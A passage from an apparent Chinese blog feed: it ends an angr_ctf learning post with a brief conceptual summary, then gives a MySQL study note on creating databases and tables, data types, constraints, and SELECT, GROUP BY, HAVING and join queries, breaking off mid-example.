id="总结">总结</span></h2><p>至此，angr的基础学习就已经结束了。通过上述十几个例题的展示，angr其实理解起来并不困难。当我们需要一串字符来触发程序中某种东西的时候，就可以使用angr。angr并不需要跑完整个程序的代码，可以只执行一个函数（调用链接库的函数），也可以跳过一个函数去执行其他代码（hook），还可以在原程序基础上加入自己想要的代码（约束）。而且通过在angr脚本中加入的约束和程序本身的代码，angr模拟原程序运行，不断改变输入，从而改变和生成不同路径，可以自动帮我们得出到达目的的输入。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文是学习&lt;a href=&quot;https://github.com/jakespringer/angr_ctf&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;angr_ctf&lt;/a&gt;所写。这里是我的一点总结和想法。&lt;/p&gt;
&lt;h2&gt;&lt;span id=&quot;安装a
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Mysql数据库笔记</title>
    <link href="http://whali3n51.top/2022/04/02/notebook/"/>
    <id>http://whali3n51.top/2022/04/02/notebook/</id>
    <published>2022-04-02T04:00:00.000Z</published>
    <updated>2022-04-14T14:56:13.166Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="mysql数据库笔记">MYSQL数据库笔记</span></h1><p>进入MySQL</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure><h2><span id="数据库操作">数据库操作</span></h2><h3><span id="创建数据库">创建数据库</span></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">DATABASE</span> 数据库名;</span><br></pre></td></tr></table></figure><p>数据库名字必须唯一；</p><h3><span id="查看数据库">查看数据库</span></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">databases</span>;</span><br></pre></td></tr></table></figure><h3><span id="使用或者切换数据库">使用或者切换数据库</span></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> 数据库名;</span><br></pre></td></tr></table></figure><h3><span id="修改数据库编码方式">修改数据库编码方式</span></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">DATABASE</span> 数据库名 <span class="keyword">DEFAULT</span> <span class="built_in">CHARACTER</span> <span class="keyword">set</span> 目标编码方式;</span><br></pre></td></tr></table></figure><h3><span id="删除数据库">删除数据库</span></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">DATABASE</span> 数据库名;</span><br></pre></td></tr></table></figure><h3><span id="数据库存储引擎">数据库存储引擎</span></h3><p><strong>InnoDB：</strong> 支持事务处理，支持外键，支持崩溃修复能力和并发控制。如果需要对事务的完整性要求比较高（比如银行），要求实现并发控制（比如售票），那选择InnoDB有很大的优势。如果需要频繁的更新、删除操作的数据库，也可以选择InnoDB，因为支持事务的提交（commit）和回滚（rollback）。</p><p><strong>MyISAM：</strong> 插入数据快，空间和内存使用比较低。如果表主要是用于插入新记录和读出记录，那么选择MyISAM能实现处理高效率。如果应用的完整性、并发性要求比 较低，也可以使用。</p><p><strong>MEMORY：</strong> 所有的数据都在内存中，数据的处理速度快，但是安全性不高。如果需要很快的读写速度，对数据的安全性要求较低，可以选择MEMOEY。它对表的大小有要求，不能建立太大的表。所以，这类数据库只使用在相对较小的数据库表。</p><p><strong>注意：</strong>同一个数据库也可以使用多种存储引擎的表。如果一个表要求比较高的事务处理，可以选择InnoDB。这个数据库中可以将查询要求比较高的表选择MyISAM存储。如果该数据库需要一个用于查询的临时表，可以选择MEMORY存储引擎。mysql数据库默认使用InnoDB存储引擎。</p><h2><span id="表操作">表操作</span></h2><h3><span id="创建表">创建表</span></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">TABLE</span> 表名(字段名<span class="number">1</span> 数据类型(完整性约束条件) PRIMARY <span class="keyword">KEY</span>, 字段名<span class="number">2</span> 数据类型,........);</span><br></pre></td></tr></table></figure><p>PRIMARY KEY 只在主键后面才有且仅有一个</p><p>主键是指唯一标识数据的属性，主键只能是非空约束。</p><p>如果需要指明多个字段为主键</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">TABLE</span> 表名(字段名<span class="number">1</span> 数据类型(完整性约束条件),字段名<span class="number">2</span> 数据类型,........, PRIMARY <span class="keyword">KEY</span>(字段x,字段y,...));</span><br></pre></td></tr></table></figure><p>若需要创建外键约束</p><p>外键约束是指引用其他表的主键。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">TABLE</span> 表名(字段名<span class="number">1</span> 数据类型(完整性约束条件), 字段名<span class="number">2</span> 数据类型,........,<span class="keyword">CONSTRAINT</span> 外键名 <span class="keyword">FOREIGN</span> <span class="keyword">KEY</span>(字段名n) <span class="keyword">REFERENCES</span> 引用表名(引用表的主键名));</span><br></pre></td></tr></table></figure><p>主键约束和外键约束不能作用于同一字段。</p><p>创建字段指明非空约束，默认是空。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">TABLE</span> 表名(字段名<span class="number">1</span> 数据类型(完整性约束条件), 字段名<span class="number">2</span> 数据类型 <span class="keyword">NOT</span> <span class="literal">NULL</span>,........);</span><br></pre></td></tr></table></figure><p>唯一约束唯一标识数据库表中的每条记录,可以定义多个。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create TABLE 表名(字段名1 数据类型(完整性约束条件), 字段名2 数据类型 UNIQUE,<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>);</span><br></pre></td></tr></table></figure><p>创建默认约束。默认约束是指，若未给该字段赋值，则默认设置为设置值。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">TABLE</span> 表名(字段名<span class="number">1</span> 数据类型(完整性约束条件), 字段名<span class="number">2</span> 数据类型 <span class="keyword">DEFAULT</span> <span class="string">'默认值'</span>,........);</span><br></pre></td></tr></table></figure><p>mysql的数据类型</p><h4><span id="数值类型">数值类型</span></h4><table><thead><tr><th align="left">类型</th><th align="center">大小</th><th align="left">范围（有符号）</th><th align="left">范围（无符号）</th><th align="left">用途</th></tr></thead><tbody><tr><td align="left">TINYINT</td><td align="center">1 Bytes</td><td align="left">(-128，127)</td><td align="left">(0，255)</td><td align="left">小整数值</td></tr><tr><td align="left">SMALLINT</td><td align="center">2 Bytes</td><td align="left">(-32 768，32 767)</td><td align="left">(0，65 535)</td><td align="left">大整数值</td></tr><tr><td align="left">MEDIUMINT</td><td align="center">3 Bytes</td><td align="left">(-8 388 608，8 388 607)</td><td align="left">(0，16 777 215)</td><td align="left">大整数值</td></tr><tr><td align="left">INT或INTEGER</td><td align="center">4 Bytes</td><td align="left">(-2 147 483 648，2 147 483 647)</td><td align="left">(0，4 294 967 295)</td><td align="left">大整数值</td></tr><tr><td align="left">BIGINT</td><td align="center">8 Bytes</td><td align="left">(-9,223,372,036,854,775,808，9 223 372 036 854 775 807)</td><td align="left">(0，18 446 744 073 709 551 615)</td><td align="left">极大整数值</td></tr><tr><td align="left">FLOAT</td><td align="center">4 Bytes</td><td align="left">(-3.402 823 466 E+38，-1.175 494 351 E-38)，0，(1.175 494 351 E-38，3.402 823 466 351 E+38)</td><td align="left">0，(1.175 494 351 E-38，3.402 823 466 E+38)</td><td align="left">单精度 浮点数值</td></tr><tr><td align="left">DOUBLE</td><td align="center">8 Bytes</td><td align="left">(-1.797 693 134 862 315 7 E+308，-2.225 073 858 507 201 4 E-308)，0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)</td><td align="left">0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)</td><td align="left">双精度 浮点数值</td></tr><tr><td align="left">DECIMAL</td><td align="center">对DECIMAL(M,D) ，如果M&gt;D，为M+2否则为D+2</td><td align="left">依赖于M和D的值</td><td align="left">依赖于M和D的值</td><td align="left">小数值</td></tr></tbody></table><h4><span id="日期和时间类型">日期和时间类型</span></h4><table><thead><tr><th align="left">类型</th><th align="left">大小 ( bytes)</th><th align="left">范围</th><th align="left">格式</th><th align="left">用途</th></tr></thead><tbody><tr><td align="left">DATE</td><td align="left">3</td><td align="left">1000-01-01/9999-12-31</td><td align="left">YYYY-MM-DD</td><td align="left">日期值</td></tr><tr><td align="left">TIME</td><td align="left">3</td><td align="left">‘-838:59:59’/‘838:59:59’</td><td align="left">HH:MM:SS</td><td align="left">时间值或持续时间</td></tr><tr><td align="left">YEAR</td><td align="left">1</td><td align="left">1901/2155</td><td align="left">YYYY</td><td align="left">年份值</td></tr><tr><td align="left">DATETIME</td><td align="left">8</td><td align="left">1000-01-01 00:00:00/9999-12-31 23:59:59</td><td align="left">YYYY-MM-DD HH:MM:SS</td><td align="left">混合日期和时间值</td></tr><tr><td align="left">TIMESTAMP</td><td align="left">4</td><td align="left">1970-01-01 00:00:00/2038结束时间是第 <strong>2147483647</strong> 秒，北京时间 <strong>2038-1-19 11:14:07</strong>，格林尼治时间 2038年1月19日 凌晨 03:14:07</td><td align="left">YYYYMMDD HHMMSS</td><td align="left">混合日期和时间值，时间戳</td></tr></tbody></table><h4><span id="字符串类型">字符串类型</span></h4><table><thead><tr><th align="left">类型</th><th align="left">大小</th><th align="left">用途</th></tr></thead><tbody><tr><td align="left">CHAR</td><td align="left">0-255 bytes</td><td align="left">定长字符串</td></tr><tr><td align="left">VARCHAR</td><td align="left">0-65535 bytes</td><td align="left">变长字符串</td></tr><tr><td align="left">TINYBLOB</td><td align="left">0-255 bytes</td><td align="left">不超过 255 个字符的二进制字符串</td></tr><tr><td align="left">TINYTEXT</td><td align="left">0-255 bytes</td><td align="left">短文本字符串</td></tr><tr><td align="left">BLOB</td><td align="left">0-65 535 bytes</td><td align="left">二进制形式的长文本数据</td></tr><tr><td align="left">TEXT</td><td align="left">0-65 535 bytes</td><td align="left">长文本数据</td></tr><tr><td align="left">MEDIUMBLOB</td><td align="left">0-16 777 215 bytes</td><td align="left">二进制形式的中等长度文本数据</td></tr><tr><td align="left">MEDIUMTEXT</td><td align="left">0-16 777 215 bytes</td><td align="left">中等长度文本数据</td></tr><tr><td align="left">LONGBLOB</td><td align="left">0-4 294 967 295 bytes</td><td align="left">二进制形式的极大文本数据</td></tr><tr><td align="left">LONGTEXT</td><td align="left">0-4 294 967 295 bytes</td><td align="left">极大文本数据</td></tr></tbody></table><h3><span id="修改数据表">修改数据表</span></h3><h4><span id="修改表名">修改表名</span></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">TABLE</span> 原表名 <span class="keyword">rename</span> 新表名;</span><br></pre></td></tr></table></figure><h4><span id="查看表字段和数据类型">查看表字段和数据类型</span></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">desc 表名;</span><br></pre></td></tr></table></figure><h4><span id="修改表字段名和数据类型">修改表字段名和数据类型</span></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">CHANGE</span> 旧字段名 新字段名 新数据类型(完整性约束);</span><br></pre></td></tr></table></figure><p>添加单个主键约束</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">MODIFY</span> 字段名 新数据类型(完整性约束) PRIMARY <span class="keyword">KEY</span>;</span><br></pre></td></tr></table></figure><p>添加多个主键约束</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">ADD</span> PRIMARY <span class="keyword">KEY</span>(字段名<span class="number">1</span>,字段名<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>删除主键约束</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">DROP</span> PRIMARY <span class="keyword">KEY</span>;</span><br></pre></td></tr></table></figure><h4><span id="修改字段位置">修改字段位置</span></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">TABLE</span> 表名 MODDIFY 原字段名 新数据类型(完整性约束) <span class="keyword">AFTER</span> 欲放置位置的前一个字段名;</span><br></pre></td></tr></table></figure><p>或者</p><p>放到表字段首</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">TABLE</span> 表名 MODDIFY 原字段名 新数据类型(完整性约束) <span class="keyword">FIRST</span>;</span><br></pre></td></tr></table></figure><h4><span id="添加字段">添加字段</span></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">ADD</span> 新字段名 新数据类型(完整性约束);</span><br></pre></td></tr></table></figure><h4><span id="删除字段">删除字段</span></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">DROP</span> 字段名;</span><br></pre></td></tr></table></figure><h4><span id="添加外键约束">添加外键约束</span></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> 外键名 <span class="keyword">FOREIGN</span> <span class="keyword">KEY</span>(该表字段名) <span class="keyword">REFERENCES</span> 引用表名(引用表的主键名) [<span class="keyword">ON</span> <span class="keyword">DELETE</span>|<span class="keyword">UPDATE</span>  RESTRICT | <span class="keyword">CASCADE</span> | <span class="keyword">SET</span> <span class="literal">NULL</span> | <span class="keyword">NO</span> <span class="keyword">ACTION</span> | <span class="keyword">SET</span> <span class="keyword">DEFAULT</span>];</span><br></pre></td></tr></table></figure><p>外键名用来唯一标识外键，不同表的外键名不能一样。当一个字段添加了外键名,插入数据时,该字段的值在引用的父表中一定要存在,否则插入数据会失败.</p><p>CONSTRAINT symbol 为外键约束名称，如果没有定义，InnoDB表会自动生成一个名称，这个名称在数据库里面必须唯一。</p><p>ON DELETE、ON UPDATE表示事件触发时的动作，默认是RESTRICT</p><p>可设置值为：</p><ul><li>CASCADE，更新或者删除父表记录时，子表中的相应记录同步更新或者删除。由级联更新或者删除导致的子表记录修改，不会触发子表的触发器执行。</li><li>SET NULL，更新或者删除父表记录时，子表中的相应记录字段设置为NULL，前提是子表中相应字段不能定义为NOT NULL。</li><li>RESTRICT，有外键关系约束时，拒绝父表记录的更新和删除操作。</li><li>NO ACTION，无动作，实际功能与RESTRICT相同。</li><li>SET DEFAULT，仅仅解析器能识别，实际功能未实现</li></ul><h4><span id="删除外键约束">删除外键约束</span></h4><p>只有一个表的主键被引用的所有外键约束全部删除了，该表的主键才能删除，否则会报错。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">DROP</span> <span class="keyword">FOREIGN</span> <span class="keyword">KEY</span> 外键名;</span><br></pre></td></tr></table></figure><h4><span id="添加唯一约束">添加唯一约束</span></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">MODIFY</span> 字段名 字段类型 <span class="keyword">UNIQUE</span>;</span><br></pre></td></tr></table></figure><h4><span id="删除唯一约束">删除唯一约束</span></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">DROP</span> <span class="keyword">UNIQUE</span> <span class="keyword">INDEX</span> 字段名;</span><br></pre></td></tr></table></figure><h4><span id="添加默认约束">添加默认约束</span></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">MODIFY</span> 字段名 字段类型 <span class="keyword">DEFAULT</span> <span class="string">'默认值'</span>;</span><br></pre></td></tr></table></figure><h4><span id="删除默认约束">删除默认约束</span></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">MODIFY</span> 字段名 字段类型;</span><br></pre></td></tr></table></figure><h2><span id="sql语句">SQL语句</span></h2><p>本文使用的数据库操作是基于employees数据库。</p><p><a href="https://github.com/datacharmer/test_db/" target="_blank" rel="noopener">https://github.com/datacharmer/test_db/</a></p><h3><span id="sql语句分类">SQL语句分类</span></h3><p><strong>DDL（Data Definition Languages）语句</strong>：数据定义语言，这些语句定义了不同的数据段、数据库、表、列、索引等数据库对象的定义。常用的语句关键字主要包括 create、drop、alter等。<br><strong>DML（Data Manipulation Language）语句</strong>：数据操纵语句，用于添加、删除、更新和查询数据库记录，并检查数据完整性，常用的语句关键字主要包括 insert、delete、udpate 和select 等。(增添改查）<br><strong>DCL（Data Control Language）语句</strong>：数据控制语句，用于控制不同数据段直接的许可和访问级别的语句。这些语句定义了数据库、表、字段、用户的访问权限和安全级别。主要的语句关键字包括 grant、revoke 等</p><h3><span id="插入">插入</span></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> 表名(字段名称<span class="number">1</span>,字段名称<span class="number">2</span>,....) <span class="keyword">values</span>(字段<span class="number">1</span>的值,字段<span class="number">2</span>的值,.....),(第二行字段<span class="number">1</span>的值,.....),(第三行字段<span class="number">1</span>的值,.....)，...;</span><br></pre></td></tr></table></figure><p>若字段是外键，则不可赋值</p><p>或者</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> 表名 <span class="keyword">values</span>(按照表的字段名称依次赋值，用逗号隔开);</span><br></pre></td></tr></table></figure><h3><span id="更新">更新</span></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> 表名 <span class="keyword">set</span> 字段名<span class="number">1</span>,字段名<span class="number">2</span>,...=指定字段值<span class="number">1</span>,指定字段值<span class="number">2</span>,.... [<span class="keyword">where</span> 条件表达式];</span><br></pre></td></tr></table></figure><p>[]内容为可选内容</p><p>修改时要注意唯一约束和外键约束。</p><p>不加where条件限制，则会导致指定字段的所有行的值变为我们设置的值</p><h3><span id="查询">查询</span></h3><h4><span id="简单查询">简单查询</span></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> 查询字段名称<span class="number">1</span>，查询字段名称<span class="number">2</span>,....<span class="comment">/*可用*代替所有字段*/</span> <span class="keyword">from</span> 表名 [<span class="keyword">where</span> 限制条件] [<span class="keyword">GROUP</span> <span class="keyword">BY</span> 字段名 [<span class="keyword">HAVING</span> 逻辑表达式]] [<span class="keyword">ORDER</span> <span class="keyword">BY</span> 字段名 [<span class="keyword">ASC</span>|<span class="keyword">DESC</span>]]</span><br></pre></td></tr></table></figure><p>[]内的内容可以省略</p><h5><span id="where-限制条件其中限制条件如下表">where 限制条件：其中限制条件如下表</span></h5><table><thead><tr><th>运算符分类</th><th>运算符</th><th>说明</th><th>使用示例</th></tr></thead><tbody><tr><td>比较运算符</td><td>&gt;、&gt;=、=、 &lt;、&lt;=、&lt;&gt;、!= 、!&gt;、!&lt;</td><td>比较字段值大小</td><td>id &gt;=5552211</td></tr><tr><td>范围运算符</td><td>BETWEEN…. AND、NOT BEWTEEN … AND</td><td>判断字段值是否在指定范围内</td><td>id between 10000 and 10000</td></tr><tr><td>列表运算符</td><td>IN 、NOT IN</td><td>判断字段值是否在指定的列表中</td><td>id in (1000,2000)、name in (‘yyds’,’wdnmd’)</td></tr><tr><td>模式匹配运算符</td><td>LIKE、NOT LIKE</td><td>判断字段值是否和指定的模式字符串匹配,通配符(%、_)</td><td>name like “wd%”、name like ‘wd_’</td></tr><tr><td>空值判断运算符</td><td>IS NULL、IS NOT NULL</td><td>判断字段值是否为空</td><td>name is NULL</td></tr><tr><td>逻辑运算符</td><td>AND、OR、NOT</td><td>用于多个条件表达式的逻辑连接</td><td>gender =’男’ and name like ‘wd’、NOT(gender=’男’)</td></tr></tbody></table><h5><span id="order-by使用">ORDER BY使用</span></h5><p>根据字段名进行排序。</p><p>用法：ORDER BY 字段名 DESC；</p><p>其中DESC为降序，ASC为升序。</p><h5><span id="limit-offsetn">limit [offset,]n;</span></h5><p>可以指定查询结果从哪一条记录开始，一共查询多少条记录。</p><p>offset 用来设置起始行数，n 用来指定检索多少行</p><h4><span id="统计查询">统计查询</span></h4><h5><span id="集合函数">集合函数</span></h5><table><thead><tr><th>集合函数</th><th>功能描述</th><th>举例</th></tr></thead><tbody><tr><td>COUNT [DISTINCT|ALL] 字段|*</td><td>计算指定字段中的个数。COUNT(*)返回满足条件的函数，包括空值行,不能于DISTINCT一起使用</td><td>select  count(*) as student_num from student.</td></tr><tr><td>SUM  [DISTINCT|ALL] 字段</td><td>计算指定字段中数据的总和（必须为数值类型）</td><td></td></tr><tr><td>AVG [DISTINCT|ALL] 字段</td><td>计算指定字段中数据的平均值（必须为数值类型）</td><td></td></tr><tr><td>MAX [DISTINCT|ALL] 字段</td><td>计算指定字段中数据的最大值</td><td></td></tr><tr><td>MIN [DISTINCT|ALL] 字段</td><td>计算指定字段中数据的最小值</td><td></td></tr></tbody></table><p>集合函数会将数据计算出来，计算出来的数据会变成新的一个字段，as就是用来给这个新字段命名，不加则计算出来的值无字段名。</p><p>例如 从 薪水表中中算出总人数，平均薪水，总薪水，最高薪水，最低薪水。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(emp_no) <span class="keyword">as</span> employees_num , <span class="keyword">avg</span>(salary) <span class="keyword">as</span> average_salary,<span class="keyword">sum</span>(salary) <span class="keyword">as</span> sum_salary, <span class="keyword">max</span>(salary) <span class="keyword">as</span> max_salary,<span class="keyword">min</span>(salary) <span class="keyword">as</span> min_salary  <span class="keyword">from</span> salaries;</span><br></pre></td></tr></table></figure><p><img src="./image-20220227205757021.png" alt="image-20220227205757021"></p><h5><span id="group-by">GROUP BY</span></h5><p>指定字段中，字段值相同的放同一组。</p><p>select指定的字段要么就要包含在group by语句的后面，作为分组的依据；要么就要被包含在聚合函数中</p><p>例如统计employees表中的男女分别多少人</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> gender,<span class="keyword">count</span>(gender) <span class="keyword">as</span> <span class="keyword">num</span> <span class="keyword">from</span> employees <span class="keyword">group</span> <span class="keyword">by</span> gender;</span><br></pre></td></tr></table></figure><p><img src="./image-20220227212824949.png" alt="image-20220227212824949"></p><p>例如统计薪水表中在1986-01-01到1987-01-01同一天入职并且拥有相同工资人数，只显示人数大于25的统计结果。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> salary,from_date, <span class="keyword">count</span>(*) <span class="keyword">as</span> <span class="keyword">num</span> <span class="keyword">from</span> salaries <span class="keyword">where</span> from_date <span class="keyword">between</span> <span class="string">'1986-01-01'</span> <span class="keyword">and</span> <span class="string">'1987-01-01'</span> <span class="keyword">group</span> <span class="keyword">by</span> salary,from_date <span class="keyword">having</span> <span class="keyword">num</span>&gt;<span class="number">25</span>;</span><br></pre></td></tr></table></figure><p><img src="./image-20220227220607313.png" alt="image-20220227220607313"></p><h5><span id="having">HAVING</span></h5><p>having通常与group by  联合使用。</p><p>having 用于对分组后的结果进行条件筛选，因此having 只能出现在group by 后面。</p><p>where的筛选条件时发生在group by 之前，并且条件中不能使用集合函数。having 子句虽然发生在group by 之后，但是可以使用集合函数。</p><p>当一个语句中同时出现where、group by、having</p><p>先选择出满足where条件的数据行，然后再进行分组，然后执行集合函数，再执行having。</p><p>例如employees表中的姓氏为“F”开头的男女生人数，但是最后只显示女生人数。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> gender,<span class="keyword">count</span>(gender) <span class="keyword">as</span> <span class="keyword">num</span> <span class="keyword">from</span> employees <span class="keyword">where</span> first_name <span class="keyword">like</span> <span class="string">"F%"</span> <span class="keyword">group</span> <span class="keyword">by</span> gender <span class="keyword">having</span> gender=<span class="string">'F'</span>;</span><br></pre></td></tr></table></figure><p><img src="./image-20220227213931429.png" alt="image-20220227213931429"></p><h4><span id="多表查询">多表查询</span></h4><p>多表查询是通过各个表之间的共同列的相关性来查询数据。多表查询首先要在这些表中建立连接，再在连接生成的结果集基础上进行查询。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> [表名.]目标字段表达式 <span class="keyword">as</span> 别名,...... <span class="keyword">from</span> 左表名 <span class="keyword">as</span> 别名 连接类型 右表名 <span class="keyword">as</span> 别名 <span class="keyword">on</span> 连接条件 <span class="keyword">where</span> 条件表达式;</span><br></pre></td></tr></table></figure><h5><span id="内连接">内连接</span></h5><p>(1) cross join: 交叉连接。相当于将一个表每一行和另一个表每一行连接在一起形成一个新的行。‘</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> 字段名 <span class="keyword">from</span> 表<span class="number">1</span> <span class="keyword">cross</span> <span class="keyword">join</span> 表名<span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>例如将deparments与dept_manager表交叉连接在一块</p><p><img src="./image-20220228154320135.png" alt="image-20220228154320135"></p><p><img src="./image-20220228154358340.png" alt="image-20220228154358340"></p><p>连接部分结果</p><p><img src="./image-20220228154435691.png" alt="image-20220228154435691"></p><p>(2) inner join 或 join: 内连接，用比较运算符设置连接条件，只返回满足连接条件的数据行，时将交叉连接生成的结果集按照连接条件进行筛选后形成的。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> 字段名 <span class="keyword">from</span> 表<span class="number">1</span> <span class="keyword">join</span> 表<span class="number">2</span> <span class="keyword">on</span> 表<span class="number">1.</span>字段名 比较运算符 表<span class="number">2.</span>字段名;</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> 字段名 <span class="keyword">from</span> 表<span class="number">1</span>,表<span class="number">2</span> <span class="keyword">where</span> 表<span class="number">1.</span>字段名 比较运算符 表<span class="number">2.</span>字段名;</span><br></pre></td></tr></table></figure><p>例如将deparments与dept_manager表在dept_no相同下的连接</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> dept_manager <span class="keyword">join</span> departments <span class="keyword">on</span> departments.dept_no=dept_manager.dept_no</span><br></pre></td></tr></table></figure><p><img src="./image-20220228155714654.png" alt="image-20220228155714654"></p><p>内连接还包括三种连接：</p><p>① 等值连接：连接条件用=来比较连接字段的值，上述例子就是等值连接。</p><p>② 非等值连接：连接条件使用除=之外的比较运算符。</p><p>③ 自然连接：与等值连接相同，都是在连接条件中使用比较运算符，但结果集中不包括重复字段。</p><p>例如上述例子使用自然连接</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> dept_manager <span class="keyword">natural</span> <span class="keyword">join</span> departments;</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> 